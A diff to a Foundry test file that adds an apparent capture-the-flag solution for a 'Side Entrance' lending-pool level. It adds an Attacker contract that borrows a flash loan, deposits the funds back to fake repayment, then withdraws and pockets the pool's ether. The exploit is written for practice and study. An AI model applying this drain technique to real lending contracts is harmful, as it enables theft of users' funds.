@@ -4,6 +4,34 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 import "../../src/side-entrance/SideEntranceLevel.sol";
 
+interface IPool {
+  function deposit() external payable;
+  function withdraw() external;
+  function flashLoan(uint256) external;
+}
+
+contract Attacker {
+  IPool internal immutable pool;
+
+  constructor(address poolAddress) {
+    pool = IPool(poolAddress);
+  }
+
+  function attack() external {
+    pool.flashLoan(1_000 ether);
+    pool.withdraw();
+
+    (bool success,) = msg.sender.call{value: 1_000 ether}("");
+    success;
+  }
+
+  function execute() external payable {
+    pool.deposit{value: msg.value}();
+  }
+
+  receive() external payable {}
+}
+
 contract SideEntranceTest is Test {
   SideEntranceLevel level = new SideEntranceLevel();
 
@@ -12,6 +40,11 @@ contract SideEntranceTest is Test {
   }
 
   function testExploit() public {
+    Attacker attacker = new Attacker(address(level.pool()));
+    attacker.attack();
+
     level.validate();
   }
+
+  receive() external payable {}
 }
